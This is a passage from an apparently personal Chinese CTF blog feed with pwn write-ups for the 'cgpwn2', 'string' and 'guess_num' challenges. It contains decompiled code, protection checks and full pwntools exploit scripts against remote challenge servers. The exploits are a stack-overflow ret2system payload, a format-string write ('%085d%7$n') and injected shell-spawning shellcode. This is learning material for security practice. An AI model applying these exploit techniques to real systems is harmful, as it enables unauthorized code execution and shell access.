class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  if ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(&quot;please tell me your name&quot;);             // 交互   1</span><br><span class="line">  fgets(name, 50, stdin);                       // 输入name    最大50字节</span><br><span class="line">  puts(&quot;hello,you can leave some message here:&quot;);// 交互    2   输入message   </span><br><span class="line">  return gets(&amp;s);                              // gets()危险函数， &amp;s在栈上的空间是 0x26   存在栈溢出漏洞</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析：这个程序里面没有-bin-sh，但在hello函数中，name是一个全局变量，我们将”-bin-sh”传入到name中，那么”-bin-sh”的地址就是name的地址。然后调用system函数去调用就可以了。"><a href="#分析：这个程序里面没有-bin-sh，但在hello函数中，name是一个全局变量，我们将”-bin-sh”传入到name中，那么”-bin-sh”的地址就是name的地址。然后调用system函数去调用就可以了。" class="headerlink" title="分析：这个程序里面没有/bin/sh，但在hello函数中，name是一个全局变量，我们将”/bin/sh”传入到name中，那么”/bin/sh”的地址就是name的地址。然后调用system函数去调用就可以了。"></a>分析：这个程序里面没有/bin/sh，但在hello函数中，name是一个全局变量，我们将”/bin/sh”传入到name中，那么”/bin/sh”的地址就是name的地址。然后调用system函数去调用就可以了。</h2><blockquote><p>先用0x26个字符填充  s所在的栈，然后4个字符覆盖ebp，system()函数地址（四个字节）覆盖原返回地址，再4个字符覆盖返回地址（随便写就好） ，再4个字节覆盖参数即（/sh/bin 的指针）</p></blockquote><h2 id="构造exp："><a href="#构造exp：" class="headerlink" title="构造exp："></a>构造exp：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#conn=process(&apos;./cgpwn2&apos;)</span><br><span class="line">conn=remote(&quot;111.198.29.45&quot;,&quot;52455&quot;)</span><br><span class="line">elf=ELF(&apos;./cgpwn2&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(&quot;please tell me your name&quot;,&quot;/bin/sh\x00&quot;)#\xhh表示二位十六进制</span><br><span class="line">name_addr=0x0804A080#name的在bss段上的地址</span><br><span class="line">#sys_addr=0x08048420#</span><br><span class="line">#我们在ida中函数栏双击system函数跳转它在plt表中的位置：</span><br><span class="line">#.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr=elf.symbols[&apos;system&apos;]</span><br><span class="line">#ELF模块的symbols[]用来取得函数在内存中的地址，推荐用这个！</span><br><span class="line">payload=&quot;A&quot;*(0x26+0x4)+p32(sys_addr)+&quot;A&quot;*4+p32(name_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(&quot;here&quot;,payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line">conn.recvall()#cyberpeace&#123;59e9622c1182d55ae83f0ad00d6dab00&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/11/u7hYOH.png" alt="u7hYOH.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">学习进度太慢，真的太慢了，应该说是学习效率不高，这个自律，有点麻烦啊！</span><br><span class="line">严格的自律就是自由！</span><br><span class="line">嗯嗯，</span><br><span class="line">我想要自由！</span><br><span class="line">我要严格自律！</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/13/nDgRiT.gif" alt="nDgRiT.gif"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新手区的pwn题还没有做完！明天要做完它！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn03</title>
    <link href="http://yoursite.com/2019/10/08/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn03/"/>
    <id>http://yoursite.com/2019/10/08/国庆七天之pwn03/</id>
    <published>2019-10-08T15:46:23.000Z</published>
    <updated>2019-10-09T15:47:44.793Z</updated>
    
    <content type="html"><![CDATA[<p>真难！</p><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><h3 id="Canary-保护（栈保护）："><a href="#Canary-保护（栈保护）：" class="headerlink" title="Canary 保护（栈保护）："></a>Canary 保护（栈保护）：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当函数存在缓冲区溢出攻击漏洞时，</span><br><span class="line">这时攻击者可以通过覆盖栈上的返回地址来让shellcode能得到执行。</span><br><span class="line">但是当我们来开启了 Canary（栈）保护，函数在开始执行的时候就先会往栈里插入 cookie信息，</span><br><span class="line">当函数真正返回的时候会验证cookile信息是否合法，如果不合法就停止运行。</span><br><span class="line">所以，当开启这个Canary保护后，攻击者再通过以上方法就会导致shellcode不能执行。</span><br></pre></td></tr></table></figure><h3 id="NX（No-eXecute）保护："><a href="#NX（No-eXecute）保护：" class="headerlink" title="NX（No-eXecute）保护："></a>NX（No-eXecute）保护：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">它的保护原理是： 将数据所在内存页标识为不可执行，当程序溢出成功开始要执行 shellcode时，</span><br><span class="line">程序会尝试再数据页面上执行指令，但当我们开启了这个保护（数据页面已经被标识为不可执行），</span><br><span class="line">CPU就会  抛出异常，而不是去执行恶意指令</span><br></pre></td></tr></table></figure><h3 id="PIE（地址空间分布随机化）保护："><a href="#PIE（地址空间分布随机化）保护：" class="headerlink" title="PIE（地址空间分布随机化）保护："></a>PIE（地址空间分布随机化）保护：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">它有三个强度：</span><br><span class="line">0：没有开启进程地址空间随机化</span><br><span class="line">1：表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2：在 1 的基础上增加  heap(堆)的随机化</span><br><span class="line"></span><br><span class="line">可以防范基于Ret2libc方式的针对DEP的攻击。</span><br><span class="line">ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</span><br></pre></td></tr></table></figure><h3 id="RELRO保护："><a href="#RELRO保护：" class="headerlink" title="RELRO保护："></a>RELRO保护：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RELRO为” PartialRELRO”时，说明我们对GOT表具有写权限。</span><br></pre></td></tr></table></figure><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><h2 id="检查文件属性及其保护："><a href="#检查文件属性及其保护：" class="headerlink" title="检查文件属性及其保护："></a>检查文件属性及其保护：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yangmutou@yangmutou-virtual-machine:~/下载$ checksec ./string</span><br><span class="line">[*] &apos;/home/yangmutou/\xe4\xb8\x8b\xe8\xbd\xbd/string&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found  //栈不可执行</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">yangmutou@yangmutou-virtual-machine:~/下载$</span><br></pre></td></tr></table></figure><h2 id="主函数："><a href="#主函数：" class="headerlink" title="主函数："></a>主函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;What should your character&apos;s name be:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;, &amp;s);                      // 交互    1</span><br><span class="line">  if ( strlen(&amp;s) &lt;= 0xC )                      // 创建   &lt;=12 个 字符的 角色名字</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();                               // 进入        sub_400A7D()  函数</span><br><span class="line">    sub_400BB9();                               // 输入east后 进入 sub_400BB9()函数</span><br><span class="line">    sub_400CA6((_DWORD *)a1);                   // 输入 一个  整型  数  和 一个字符串后 来到 sub_400CA6(v3[0]) 函数</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&apos;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sub-400A7D-函数："><a href="#sub-400A7D-函数：" class="headerlink" title="sub_400A7D()函数："></a>sub_400A7D()函数：</h2><blockquote><p>这个函数其实没有做什么，当我们输入east  就绕过了所有判断，进入下一个函数sub_400BB9()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1; // [rsp+0h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;                                             // 交互  2   （只能选east） 然后 就出去这个函数了</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&apos;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进入sub-400BB9-函数："><a href="#进入sub-400BB9-函数：" class="headerlink" title="进入sub_400BB9()函数："></a>进入sub_400BB9()函数：</h2><blockquote><p>输入   1   然后我们利用格式化字符串漏洞，将v3[0]的内容变为  85</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  __int64 v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">  char format; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);// 走了会  回到 原路   </span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);// 然后 有个 新的洞，   肯定进去啊 不然也一直绕吗！</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);                     // 交互三      输入    1</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);               // 给我一个   地址</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);                  // 交互4   输入 v2  </span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);               // 交互  5  输入  一个字符串 %085d%7$n</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);                   // 这里有个 格式化  漏洞！</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sub-400CA6-DWORD-a1-函数："><a href="#sub-400CA6-DWORD-a1-函数：" class="headerlink" title="sub_400CA6((_DWORD *)a1)函数："></a>sub_400CA6((_DWORD *)a1)函数：</h2><blockquote><p>通过使得v3[0]==v3[1]==85   可通过下面sub_400CA6（）函数的判断，执行 read(0, v1, 0x100uLL); 这里看注释就好！ </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *a1 == a1[1] )                           // 于是 我们的 目的  就是使：v3[0]==v3[1]</span><br><span class="line">  &#123;                                                 //</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);  // v1  为申请  一个 可rwx的 1000空间 首地址</span><br><span class="line">    read(0, v1, 0x100uLL);                      // 最大可读取  100 个字符</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wp:     http://virgin-forest.top/2019/05/16/ctf-nuaactf-string/</span><br><span class="line"></span><br><span class="line">wp:     https://github.com/susers/Writeups/blob/master/2017/NUAACTF/pwn/string/Writeup.md</span><br><span class="line"></span><br><span class="line">pwntools:     https://bbs.pediy.com/thread-247217.htm</span><br></pre></td></tr></table></figure><h2 id="测出偏移位："><a href="#测出偏移位：" class="headerlink" title="测出偏移位："></a>测出偏移位：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./string&quot;)</span><br><span class="line">p.recvuntil(&quot;secret[0] is&quot;)</span><br><span class="line">addr = int(p.recvuntil(&quot;\n&quot;).strip(),16)        #取v3[0]的地址</span><br><span class="line">p.recvuntil(&quot;What should your character&apos;s name be:&quot;)</span><br><span class="line">p.sendline(&quot;AAAA&quot;)</span><br><span class="line">p.recvuntil(&quot;?east or up?:&quot;)</span><br><span class="line">p.sendline(&quot;east&quot;)</span><br><span class="line">p.recvuntil(&quot;or leave(0)?:&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;an address&apos;&quot;)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(&quot;And, you wish is:&quot;)</span><br><span class="line">payload = &quot;AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x&quot; //可得到第七个%x对应 的是41414141  即偏移量是7</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="n-x"><a href="#n-x" class="headerlink" title="%n$x"></a>%n$x</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表示的是【把第n个参数输出来】。因为我们的整数本身也不一定是正好放在format参数的后面，而且这里的程序是64bit的，64bit传入参数的时候，之前的参数的会放在寄存器中，多余的参数才会放到栈上，传参的顺序为【rdi,rsi,rdx,rcx,r8,r9，栈】。</span><br></pre></td></tr></table></figure><p>呃呃呃，不行，思绪太乱了！唉！</p><h2 id="085d-7-n"><a href="#085d-7-n" class="headerlink" title="%085d%7$n"></a>%085d%7$n</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将%n之前已经输出  85宽度（即相当于85字节），于是将85写道（作为）偏移量为7  的地址对应的内容！</span><br></pre></td></tr></table></figure><h2 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#conn = process(&quot;./string&quot;)</span><br><span class="line">conn = remote(&quot;111.198.29.45&quot;,&quot;41098&quot;)</span><br><span class="line">conn.recvuntil(&quot;secret[0] is&quot;)</span><br><span class="line">addr = int(conn.recvuntil(&quot;\n&quot;).strip(),16)</span><br><span class="line">conn.recvuntil(&quot;What should your character&apos;s name be:&quot;)</span><br><span class="line">conn.sendline(&quot;AAAA&quot;)</span><br><span class="line">conn.recvuntil(&quot;?east or up?:&quot;)</span><br><span class="line">conn.sendline(&quot;east&quot;)</span><br><span class="line">conn.recvuntil(&quot;or leave(0)?:&quot;)</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line">conn.recvuntil(&quot;an address&apos;&quot;)</span><br><span class="line">conn.sendline(str(addr))</span><br><span class="line">conn.recvuntil(&quot;And, you wish is:&quot;)</span><br><span class="line">payload = &quot;%085d%7$n&quot;</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.recvuntil(&quot;I will help you! USE YOU SPELL&quot;)</span><br><span class="line">conn.sendline(asm(shellcraft.amd64.linux.sh(), arch=&apos;amd64&apos;))</span><br><span class="line">conn.interactive()      #cyberpeace&#123;5450ea982596245eb4f6daebf413b4d9&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#在python的pwntools库中可以用 asm(shellcraft.amd64.linux.sh(), arch=’amd64’) 生成shellcode</span><br></pre></td></tr></table></figure><h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><h2 id="检查文件属性及其保护"><a href="#检查文件属性及其保护" class="headerlink" title="检查文件属性及其保护"></a>检查文件属性及其保护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yangmutou@yangmutou-virtual-machine:~/下载$ checksec ./guess_num</span><br><span class="line">[*] &apos;/home/yangmutou/\xe4\xb8\x8b\xe8\xbd\xbd/guess_num&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">yangmutou@yangmutou-virtual-machine:~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>开启了Canary 保护，NX（DEP）保护PIE（ASLR），<br>这里我们再稍稍 记下这些保护的作用</p></blockquote><h1 id><a href="#" class="headerlink" title></a></h1><h2 id="拖入ida-开始分析漏洞："><a href="#拖入ida-开始分析漏洞：" class="headerlink" title="拖入ida 开始分析漏洞："></a>拖入ida 开始分析漏洞：</h2><blockquote><p>这里需要了解下 srand 以及 rand函数：</p></blockquote><blockquote><p>链接：<a href="https://blog.csdn.net/cmm0401/article/details/54599083" target="_blank" rel="noopener">https://blog.csdn.net/cmm0401/article/details/54599083</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  int v5; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  int v7; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  v3 = stderr;</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, 0LL);</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Welcome to a guess number game!&quot;);</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Please let me know your name!&quot;);</span><br><span class="line">  printf(&quot;Your name:&quot;);                         // 交互    1</span><br><span class="line">  gets(&amp;v8);                                    //gets()是危险函数，漏洞点就在这里</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % 6 + 1;</span><br><span class="line">    printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));</span><br><span class="line">    printf(&quot;Please input your guess number:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v5);                  // 交互     2  </span><br><span class="line">    puts(&quot;---------------------------------&quot;);</span><br><span class="line">    if ( v5 != v7 )                             // 即是 让我们输入的数 等与  随机生成的数  10次</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;GG!&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();                                    // system(&quot;cat flag&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="我们点进去-gets函数的参数在栈中空间大小"><a 